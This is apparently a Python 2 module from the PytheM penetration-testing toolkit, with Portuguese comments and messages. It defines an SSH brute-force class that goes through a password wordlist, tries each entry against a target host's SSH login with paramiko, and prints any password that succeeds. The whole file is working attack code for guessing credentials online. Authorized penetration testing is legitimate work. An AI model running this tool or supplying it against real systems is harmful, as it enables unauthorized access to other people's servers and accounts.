#!/usr/bin/env python2.7
#coding=UTF-8

# Copyright (c) 2016 m4n3dw0lf
#
# Este arquivo é parte do programa PytheM

# PytheM é um software livre; você pode redistribuí-lo e/ou 
# modificá-lo dentro dos termos da Licença Pública Geral GNU como 
# publicada pela Fundação do Software Livre (FSF); na versão 3 da 
# Licença, ou (na sua opinião) qualquer versão.

# Este programa é distribuído na esperança de que possa ser  útil, 
# mas SEM NENHUMA GARANTIA; sem uma garantia implícita de ADEQUAÇÃO
# a qualquer MERCADO ou APLICAÇÃO EM PARTICULAR. Veja a
# Licença Pública Geral GNU para maiores detalhes.

# Você deve ter recebido uma cópia da Licença Pública Geral GNU junto
# com este programa, Se não, veja <http://www.gnu.org/licenses/>.

import paramiko, sys, os, socket


class SSHbrutus(object):
	

	def __init__ (self, target, username ,file):

		self.target = target
		self.username = username
		self.file = file
		self.line = "\n------------------------------------------------------------------\n"

		if os.path.exists(file) == False:
			print "\n[!] Caminho para a wordlist não existe!."


	def ssh_connect(self,password, code = 0):
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		try:
			ssh.connect(self.target, port=22, username=self.username, password=password)
		except paramiko.AuthenticationException:
			code = 1
		except socket.error, e:
			code = 2
		ssh.close()
		return code

	def start(self):
		input_file = open(self.file)
		print ""
		for i in input_file.readlines():
			password = i.strip("\n")
			try:
				response = self.ssh_connect(password)
				if response == 0:
					print "{}[+] Usuário: {} [+] Senha Encontrada: {}{}".format(self.line,self.username, password, self.line)
			
				elif response == 1:
					print "[-] Usuário: {} [-] Senha: {} -->  [+]Login Incorreto[-]  <--".format(self.username,password)

				elif response == 2:
					print "[!] Conexão não pode ser estabelecida com o endereço: {}".format(self.target)
			
			except Exception, e:
				print e
				pass
		input_file.close()
